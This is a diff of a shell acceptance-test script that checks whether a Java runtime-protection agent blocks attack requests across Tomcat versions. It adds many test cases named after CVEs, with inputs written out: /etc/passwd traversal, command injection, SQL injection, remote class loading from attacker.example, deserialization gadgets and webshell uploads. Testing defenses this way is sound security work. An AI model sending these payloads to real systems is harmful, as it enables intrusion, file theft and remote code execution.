+  expect_block "$version" request_spark_unacc_rest_submission -X POST -H "Content-Type: application/json" --data-binary "$spark_rest_submission_body" "${protected_url}/v1/submissions/create"
   expect_block "$version" request_hadoop_yarn_command_submission "${protected_url}/rasp/policy/remote-hadoop-yarn-command-submission"
   expect_block "$version" request_teamcity_cve_2024_27198_internal_forward "${protected_url}/rasp/policy/request-internal-forward"
   expect_block "$version" request_java_bean_pollution -G --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i" "${protected_url}/rasp/request"
@@ -703,6 +1184,7 @@ SOAP
   expect_block "$version" request_path_confusion_dot_segment -G --data-urlencode "uri=/./admin" "${protected_url}/rasp/policy/request-path-confusion"
   expect_block "$version" request_shiro_cve_2010_3863_dot_segment_admin -G --data-urlencode "uri=/./admin" "${protected_url}/rasp/policy/request-path-confusion"
   expect_block "$version" request_shiro_cve_2020_1957_semicolon_traversal_admin -G --data-urlencode "uri=/xxx/..;/admin/" "${protected_url}/rasp/policy/request-path-confusion"
+  expect_block "$version" request_spring_cve_2018_1271_path_normalization_reference -G --data-urlencode "uri=${nexus_cve_2024_4956_path}" "${protected_url}/rasp/policy/request-path-confusion"
   expect_block "$version" request_nexus_cve_2024_4956_encoded_slash_traversal -G --data-urlencode "uri=${nexus_cve_2024_4956_path}" "${protected_url}/rasp/policy/request-path-confusion"
   expect_block "$version" request_elasticsearch_cve_2015_3337_plugin_traversal -G --data-urlencode "uri=/_plugin/head/../../../../../../../../../etc/passwd" "${protected_url}/rasp/policy/request-path-confusion"
   expect_block "$version" request_elasticsearch_cve_2015_5531_snapshot_traversal -G --data-urlencode "uri=/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" "${protected_url}/rasp/policy/request-path-confusion"
@@ -712,9 +1194,12 @@ SOAP
   expect_block "$version" request_spring_cve_2022_22978_regex_requestmatcher_lf -G --data-urlencode "uri=/admin/%0atest" "${protected_url}/rasp/policy/request-path-confusion"
   expect_block "$version" request_spring_cve_2022_22978_regex_requestmatcher_cr -G --data-urlencode "uri=/admin/%0dtest" "${protected_url}/rasp/policy/request-path-confusion"
   expect_block "$version" request_path_confusion_lenient -G --data-urlencode "uri=/setup/setup-s/%2>%2>/%2>%2>/user-create.jsp" "${protected_url}/rasp/policy/request-path-confusion"
+  expect_block "$version" request_openfire_cve_2008_6508_setup_traversal -G --data-urlencode "uri=/setup/setup-/../../user-create.jsp" "${protected_url}/rasp/policy/request-path-confusion"
   expect_block "$version" request_openfire_cve_2023_32315_unicode_setup_traversal -G --data-urlencode "uri=/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp" "${protected_url}/rasp/policy/request-path-confusion"
   expect_block "$version" request_path_confusion_overlong -G --data-urlencode "uri=/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd" "${protected_url}/rasp/policy/request-path-confusion"
+  expect_block "$version" request_glassfish_cve_2017_1000028_overlong_traversal -G --data-urlencode "uri=${glassfish_cve_2017_1000028_path}" "${protected_url}/rasp/policy/request-path-confusion"
   expect_block "$version" request_path_confusion_ghostbits "${protected_url}/rasp/policy/request-spring-jetty-ghostbits-path-confusion"
+  expect_block "$version" request_spring_cve_2025_41242_ghostbits_path_traversal "${protected_url}/rasp/policy/request-spring-cve-2025-41242-ghostbits-path-traversal"
   expect_block "$version" request_path_confusion "${protected_url}/rasp/policy/request-flink-log-path-traversal"
   expect_block "$version" request_internal_resource "${protected_url}/rasp/policy/request-internal-resource"
   expect_block "$version" request_jetty_cve_2021_28164_encoded_dot_webinf -G --data-urlencode "uri=/%2e/WEB-INF/web.xml" --data-urlencode "query=" "${protected_url}/rasp/policy/request-internal-resource"
@@ -723,6 +1208,8 @@ SOAP
   expect_block "$version" request_jetty_cve_2021_34429_nul_dot_webinf -G --data-urlencode "uri=/.%00/WEB-INF/web.xml" --data-urlencode "query=" "${protected_url}/rasp/policy/request-internal-resource"
   expect_block "$version" request_jetty_cve_2021_34429_nul_dotdot_webinf -G --data-urlencode "uri=/a/b/..%00/WEB-INF/web.xml" --data-urlencode "query=" "${protected_url}/rasp/policy/request-internal-resource"
   expect_block "$version" request_forged_include_attribute "${protected_url}/rasp/policy/request-forged-include-attribute"
+  expect_block "$version" request_tomcat_cve_2020_1938_ghostcat_include "${protected_url}/rasp/policy/request-tomcat-cve-2020-1938-ajp-include"
+  expect_block "$version" request_tomcat_cnvd_2020_10487_ghostcat_include "${protected_url}/rasp/policy/request-tomcat-cve-2020-1938-ajp-include"
   expect_block "$version" command_userinput -G --data-urlencode "cmd=sh" --data-urlencode "arg=-c" --data-urlencode "arg=cat /etc/passwd; id" "${protected_url}/rasp/command"
   expect_block "$version" command_common "${protected_url}/rasp/command/common"
   expect_block "$version" command_error "${protected_url}/rasp/command/error"
@@ -733,10 +1220,12 @@ SOAP
   expect_block "$version" command_config_injection "${protected_url}/rasp/policy/command-config-injection"
   expect_block "$version" command_rocketmq_cve_2023_33246_filterserver "${protected_url}/rasp/policy/command-rocketmq-cve-2023-33246-filterserver"
   expect_block "$version" readFile_userinput -G --data-urlencode "path=/etc/passwd" "${protected_url}/rasp/file/read"
+  expect_block "$version" readFile_weblogic_weak_password_file_read -G --data-urlencode "path=/etc/passwd" "${protected_url}/hello/file.jsp"
   expect_block "$version" readFile_unwanted "${protected_url}/rasp/file/read-sensitive"
   expect_block "$version" readFile_outsideWebroot "${protected_url}/rasp/file/read-outside"
   expect_block "$version" readFile_userinput_http -G --data-urlencode "file=http://127.0.0.1/internal" "${protected_url}/rasp/policy/read-http"
   expect_block "$version" readFile_userinput_unwanted -G --data-urlencode "file=file:///etc/passwd" "${protected_url}/rasp/policy/read-unwanted"
+  expect_block "$version" readFile_metabase_cve_2021_41277_geojson_file_url -G --data-urlencode "url=file:////etc/passwd" "${protected_url}/api/geojson"
   expect_block "$version" readFile_argument_expansion "${protected_url}/rasp/policy/argument-file-expansion"
   expect_block "$version" readFile_jenkins_cve_2024_23897_proc_environ -G --data-urlencode "arg=help" --data-urlencode "arg=1" --data-urlencode "arg=@/proc/self/environ" "${protected_url}/rasp/policy/argument-file-expansion"
   expect_block "$version" readFile_jenkins_cve_2024_23897_connect_node_passwd -G --data-urlencode "arg=connect-node" --data-urlencode "arg=@/etc/passwd" "${protected_url}/rasp/policy/argument-file-expansion"
@@ -765,10 +1254,12 @@ SOAP
   expect_block "$version" jndi_jaas_config -G --data-urlencode "provider=${jaas_provider_url}" "${protected_url}/rasp/jaas/config"
   expect_block "$version" jndi_kafka_cve_2023_25194_druid_sampler_jaas -X POST -H "Content-Type: application/json" --data-binary "$kafka_druid_sampler_body" "${protected_url}/druid/indexer/v1/sampler?for=connect"
   expect_block "$version" classloader_remote -G --data-urlencode "codebase=http://attacker.example/evil.jar" "${protected_url}/rasp/classloader/url"
+  expect_block "$version" classloader_java_rmi_codebase_remote_classload -G --data-urlencode "codebase=http://attacker.example/Exploit" "${protected_url}/rasp/classloader/rmi-codebase"
   expect_block "$version" spring_remote_config -G --data-urlencode "config=http://127.0.0.1:9/poc.xml" "${protected_url}/rasp/spring/config"
   expect_block "$version" jmx_remote_config "${protected_url}/rasp/jmx/invoke"
   expect_block "$version" jmx_activemq_jolokia_broker_config -X POST -H "Content-Type: application/json" --data-binary "$activemq_jolokia_body" "${protected_url}/api/jolokia/"
   expect_block "$version" jmx_activemq_jolokia_file_write -X POST -H "Content-Type: application/json" --data-binary "$activemq_jolokia_file_write_body" "${protected_url}/api/jolokia/"
+  expect_block "$version" jmx_activemq_cve_2022_41678_jfr_copyto_webshell -X POST -H "Content-Type: application/json" --data-binary "$activemq_jolokia_jfr_copy_body" "${protected_url}/api/jolokia/"
   expect_block "$version" jmx_file_write "${protected_url}/rasp/jmx/write"
   expect_block "$version" sql_userinput -G --data-urlencode "value=' OR '1'='1" "${protected_url}/rasp/sql"
   expect_block "$version" sql_policy "${protected_url}/rasp/policy/sql-policy"
@@ -781,34 +1272,59 @@ SOAP
   expect_block "$version" sql_nacos_cve_2021_29442_derby_ops_code_execution -G --data-urlencode "sql=${nacos_derby_code_sql}" "${protected_url}/nacos/v1/cs/ops/derby"
   expect_block "$version" jdbc_mysql_deserialization -G --data-urlencode "url=${mysql_jdbc_url}" "${protected_url}/rasp/jdbc/mysql"
   expect_block "$version" jdbc_linkis_cve_2022_44645_mysql_datasource_connect -X POST -H "Content-Type: application/json;charset=UTF-8" --data-binary "$linkis_mysql_datasource_body" "${protected_url}/api/rest_j/v1/data-source-manager/op/connect/json"
+  expect_block "$version" jdbc_linkis_cve_2023_27987_mysql_datasource_connect -X POST -H "Content-Type: application/json;charset=UTF-8" --data-binary "$linkis_mysql_datasource_body" "${protected_url}/api/rest_j/v1/data-source-manager/op/connect/json"
+  expect_block "$version" jdbc_linkis_cve_2023_29215_mysql_datasource_connect -X POST -H "Content-Type: application/json;charset=UTF-8" --data-binary "$linkis_mysql_datasource_body" "${protected_url}/api/rest_j/v1/data-source-manager/op/connect/json"
+  expect_block "$version" jdbc_linkis_cve_2023_46801_mysql_datasource_connect -X POST -H "Content-Type: application/json;charset=UTF-8" --data-binary "$linkis_mysql_datasource_body" "${protected_url}/api/rest_j/v1/data-source-manager/op/connect/json"
   expect_block "$version" deserialization_blacklist "${protected_url}/rasp/deserialize"
   expect_block "$version" deserialization_coldfusion_amf -X POST -H "Content-Type: application/x-amf" --data-binary "@${coldfusion_amf_body_file}" "${protected_url}/flex2gateway/amf"
   expect_block "$version" deserialization_gadget "${protected_url}/rasp/policy/deserialization-gadget"
   expect_block "$version" deserialization_cluster_message "${protected_url}/rasp/policy/deserialization-cluster-message"
   expect_block "$version" deserialization_tomcat_cve_2026_34486_tribes_encrypt -G --data-urlencode "class=org.apache.commons.collections.functors.InvokerTransformer" "${protected_url}/rasp/policy/deserialization-cluster-message"
+  expect_block "$version" deserialization_tomcat_cve_2026_29146_tribes_padding_oracle -G --data-urlencode "class=org.apache.commons.collections.functors.InvokerTransformer" "${protected_url}/rasp/policy/deserialization-cluster-message"
   expect_block "$version" deserialization_logging_message "${protected_url}/rasp/policy/deserialization-logging-message"
+  expect_block "$version" deserialization_log4j_cve_2017_5645_socket_server "${protected_url}/rasp/policy/deserialization-logging-message"
   expect_block "$version" deserialization_webflow_state "${protected_url}/rasp/policy/deserialization-webflow-state"
   expect_block "$version" deserialization_cas_webflow_execution_state -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$cas_webflow_body" "${protected_url}/cas/login"
+  expect_block "$version" deserialization_apereo_cas_4_1_webflow_execution_state -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$cas_webflow_body" "${protected_url}/cas/login"
   expect_block "$version" deserialization_rmi_transport "${protected_url}/rasp/policy/deserialization-rmi-transport"
+  expect_block "$version" deserialization_jmeter_cve_2018_1297_rmi_transport "${protected_url}/rasp/policy/deserialization-rmi-transport"
   expect_block "$version" deserialization_neo4j_shell_rmi -G --data-urlencode "gadget=org.mozilla.javascript.NativeJavaObject" "${protected_url}/neo4j-shell/setSessionVariable"
+  expect_block "$version" deserialization_neo4j_cve_2021_34371_shell_rmi -G --data-urlencode "gadget=org.mozilla.javascript.NativeJavaObject" "${protected_url}/neo4j-shell/setSessionVariable"
   expect_block "$version" deserialization_remoting_transport "${protected_url}/rasp/policy/deserialization-remoting-transport"
+  expect_block "$version" deserialization_weblogic_cve_2018_2628_t3_jrmpclient "${protected_url}/rasp/policy/deserialization-weblogic-cve-2018-2628-t3-jrmpclient"
+  expect_block "$version" deserialization_weblogic_cve_2023_21839_iiop_jndi "${protected_url}/rasp/policy/deserialization-weblogic-cve-2023-21839-iiop-jndi"
   expect_block "$version" deserialization_jms_object_message "${protected_url}/rasp/policy/deserialization-jms-object-message"
+  expect_block "$version" deserialization_activemq_cve_2015_5254_object_message_browse -G --data-urlencode "JMSDestination=event" --data-urlencode "JMSMessageID=ID:1" "${protected_url}/admin/message.jsp"
   expect_block "$version" deserialization_signed_object "${protected_url}/rasp/policy/deserialization-signed-object"
+  expect_block "$version" deserialization_jenkins_cve_2017_1000353_cli_signed_object -X POST -H "Content-Type: application/octet-stream" --data-binary "$java_serialized_body" "${protected_url}/cli"
   expect_block "$version" deserialization_session_file -G --data-urlencode "id=.deserialize" "${protected_url}/rasp/policy/deserialization-session-file"
+  expect_block "$version" deserialization_tomcat_cve_2025_24813_session_file -H "Cookie: ${tomcat_cve_2025_24813_session_cookie}" "${protected_url}/"
   expect_block "$version" deserialization_protocol_class -G --data-urlencode "xml=http://attacker.example/poc.xml" "${protected_url}/rasp/policy/deserialization-protocol-class"
+  expect_block "$version" deserialization_activemq_cve_2023_46604_openwire_protocol_class -G --data-urlencode "class=org.springframework.context.support.ClassPathXmlApplicationContext" --data-urlencode "xml=http://attacker.example/poc.xml" "${protected_url}/api/openwire"
   expect_block "$version" deserialization_http_invoker -H "Content-Type: application/x-java-serialized-object" "${protected_url}/rasp/policy/deserialization-http-invoker"
+  expect_block "$version" deserialization_dubbo_cve_2019_17564_http_invoker -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${protected_url}/org.vulhub.api.CalcService"
   expect_block "$version" deserialization_http_object_stream "${protected_url}/rasp/policy/deserialization-http-object-stream"
   expect_block "$version" deserialization_jboss_readonly -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${protected_url}/invoker/readonly"
   expect_block "$version" deserialization_jboss_jmxinvoker -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${protected_url}/invoker/JMXInvokerServlet"
   expect_block "$version" deserialization_jbossmq_httpil -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${protected_url}/jbossmq-httpil/HTTPServerILServlet"
+  expect_block "$version" deserialization_jboss_cve_2017_12149_readonly -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${protected_url}/invoker/readonly"
+  expect_block "$version" deserialization_jboss_cve_2017_7504_httpil -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${protected_url}/jbossmq-httpil/HTTPServerILServlet"
   expect_block "$version" deserialization_hessian_type "${protected_url}/rasp/policy/deserialization-hessian-type"
+  expect_block "$version" deserialization_xxl_job_hessian_api -X POST -H "Content-Type: x-application/hessian" --data-binary "$xxl_job_hessian_body" "${protected_url}/xxl-job-admin/api"
   expect_block "$version" deserialization_xmlrpc_serialized -H "Content-Type: application/xml" "${protected_url}/rasp/policy/deserialization-xmlrpc-serialized"
+  expect_block "$version" deserialization_ofbiz_cve_2020_9496_xmlrpc_serialized -X POST -H "Content-Type: application/xml" --data-binary "$ofbiz_xmlrpc_serialized_body" "${protected_url}/webtools/control/xmlrpc"
+  expect_block "$version" deserialization_ofbiz_cve_2023_49070_xmlrpc_serialized -X POST -H "Content-Type: application/xml" --data-binary "$ofbiz_xmlrpc_serialized_body" "${protected_url}/webtools/control/xmlrpc"
   expect_block "$version" deserialization_rmi_registry_bind "${protected_url}/rasp/policy/deserialization-rmi-registry-bind"
+  expect_block "$version" deserialization_java_rmi_registry_bind "${protected_url}/rasp/policy/deserialization-rmi-registry-bind"
+  expect_block "$version" deserialization_java_rmi_registry_bind_bypass "${protected_url}/rasp/policy/deserialization-rmi-registry-bind-bypass"
   expect_block "$version" deserialization_polymorphic_type -G --data-urlencode "parser=fastjson" --data-urlencode "type=com.sun.rowset.JdbcRowSetImpl" "${protected_url}/rasp/deserialize/polymorphic"
   expect_block "$version" deserialization_fastjson_1224_autotype -X POST -H "Content-Type: application/json" --data-binary "$fastjson_1224_body" "${protected_url}/fastjson"
+  expect_block "$version" deserialization_fastjson_cve_2017_18349_1224_autotype -X POST -H "Content-Type: application/json" --data-binary "$fastjson_1224_body" "${protected_url}/fastjson"
   expect_block "$version" deserialization_fastjson_1247_autotype_bypass -X POST -H "Content-Type: application/json" --data-binary "$fastjson_1247_body" "${protected_url}/fastjson"
   expect_block "$version" deserialization_jackson_templates_polymorphic -X POST -H "Content-Type: application/json" --data-binary "$jackson_templates_body" "${protected_url}/exploit"
+  expect_block "$version" deserialization_jackson_cve_2017_7525_templatesimpl -X POST -H "Content-Type: application/json" --data-binary "$jackson_templates_body" "${protected_url}/exploit"
   expect_block "$version" deserialization_jackson_spring_xml_polymorphic -X POST -H "Content-Type: application/json" --data-binary "$jackson_spring_xml_body" "${protected_url}/exploit"
+  expect_block "$version" deserialization_jackson_cve_2017_17485_spring_xml -X POST -H "Content-Type: application/json" --data-binary "$jackson_spring_xml_body" "${protected_url}/exploit"
   expect_block "$version" deserialization_snakeyaml_h2_type -G --data-urlencode "parser=snakeyaml" --data-urlencode "type=org.h2.jdbc.JdbcConnection" "${protected_url}/rasp/deserialize/polymorphic"
   expect_block "$version" xml_decoder_runtime "${protected_url}/rasp/xml/decoder"
   expect_block "$version" xml_decoder_runtime_weblogic_workcontext -X POST -H "Content-Type: text/xml" --data-binary "$weblogic_workcontext_body" "${protected_url}/wls-wsat/CoordinatorPortType"
@@ -817,16 +1333,21 @@ SOAP
   expect_block "$version" xxe_file "${protected_url}/rasp/policy/xxe-file"
   expect_block "$version" xop_attachment_file -G --data-urlencode "href=file:///etc/hosts" "${protected_url}/rasp/policy/xml-attachment"
   expect_block "$version" xop_attachment_cxf_aegis -X POST -H "Content-Type: multipart/related; boundary=----kkkkkk123123213" --data-binary "$cxf_xop_body" "${protected_url}/test"
+  expect_block "$version" xop_attachment_cxf_cve_2024_28752_aegis_file_read -X POST -H "Content-Type: multipart/related; boundary=----kkkkkk123123213" --data-binary "$cxf_xop_body" "${protected_url}/test"
   expect_block "$version" include_userinput -G --data-urlencode "file=/etc/passwd" "${protected_url}/rasp/policy/include-userinput"
   expect_block "$version" include_protocol "${protected_url}/rasp/policy/include-protocol"
   expect_block "$version" fileUpload_multipart_script "${protected_url}/rasp/policy/upload-script"
   expect_block "$version" fileUpload_multipart_expression "${protected_url}/rasp/policy/upload-expression-filename"
   expect_block "$version" fileUpload_struts2_s2046_filename -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2046_boundary}" --data-binary "@${struts2_s2046_body_file}" "${protected_url}/index.action"
+  expect_block "$version" fileUpload_struts2_cve_2017_5638_s2046_filename -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2046_boundary}" --data-binary "@${struts2_s2046_body_file}" "${protected_url}/index.action"
   expect_block "$version" fileUpload_path_traversal "${protected_url}/rasp/policy/upload-traversal"
+  expect_block "$version" fileUpload_flink_cve_2020_17518_jar_upload -X POST -H "Content-Type: multipart/form-data; boundary=${flink_cve_2020_17518_boundary}" --data-binary "@${flink_cve_2020_17518_body_file}" "${protected_url}/jars/upload"
   expect_block "$version" fileUpload_multipart_html "${protected_url}/rasp/policy/upload-html"
   expect_block "$version" fileUpload_multipart_exe "${protected_url}/rasp/policy/upload-exe"
   expect_block "$version" fileUpload_java_archive "${protected_url}/rasp/policy/plugin-upload"
+  expect_block "$version" fileUpload_metersphere_plugin_add_jar_upload -X POST -F "file=@${metersphere_plugin_jar_file};filename=Evil.jar;type=application/java-archive" "${protected_url}/plugin/add"
   expect_block "$version" fileUpload_weblogic_ws_utc_jsp -X POST -H "Content-Type: multipart/form-data; boundary=ohmyrasp" "${protected_url}/ws_utc/resources/setting/keystore?filename=shell.jsp"
+  expect_block "$version" fileUpload_weblogic_cve_2018_2894_ws_utc_jsp -X POST -H "Content-Type: multipart/form-data; boundary=ohmyrasp" "${protected_url}/ws_utc/resources/setting/keystore?filename=shell.jsp"
   expect_block "$version" fileUpload_activemq_fileserver_move -X MOVE -H "Destination: ${activemq_fileserver_destination}" "${protected_url}/fileserver/2.txt"
   expect_block "$version" fileUpload_webdav "${protected_url}/rasp/policy/webdav"
   expect_block "$version" fileUpload_webdav "${protected_url}/rasp/policy/webdav-unsafe-destination"
@@ -843,6 +1364,7 @@ SOAP
   expect_block "$version" jiffle_runtime "${protected_url}/rasp/policy/jiffle-runtime"
   expect_block "$version" jiffle_runtime_geoserver_wms -X POST -H "Content-Type: application/xml" --data-binary "$geoserver_jiffle_wps_body" "${protected_url}/geoserver/wms"
   expect_block "$version" jiffle_runtime_geoserver_cve_2022_24816_wms -X POST -H "Content-Type: application/xml" --data-binary "$geoserver_jiffle_wps_body" "${protected_url}/geoserver/wms"
+  expect_block "$version" jiffle_runtime_geoserver_cve_2023_35042_jai_ext_wms -X POST -H "Content-Type: application/xml" --data-binary "$geoserver_jiffle_wps_body" "${protected_url}/geoserver/wms"
   expect_block "$version" script_runtime -G --data-urlencode "script=java.lang.Runtime.getRuntime().exec('id')" "${protected_url}/rasp/script/jsr223"
   expect_block "$version" script_runtime_stack "${protected_url}/rasp/policy/script-command-stack"
   expect_block "$version" xpath_runtime -G --data-urlencode "expr=exec(java.lang.Runtime.getRuntime(),'touch /tmp/success')" "${protected_url}/rasp/xpath"
@@ -1028,4 +1550,4 @@ if [[ "$missing_redirect" -ne 0 || "$missing" -ne 0 ]]; then
   exit 1
 fi
 
-echo "acceptance passed across Tomcat 9, 10, and 11"
+echo "acceptance passed across Tomcat 11, 10, and 9"
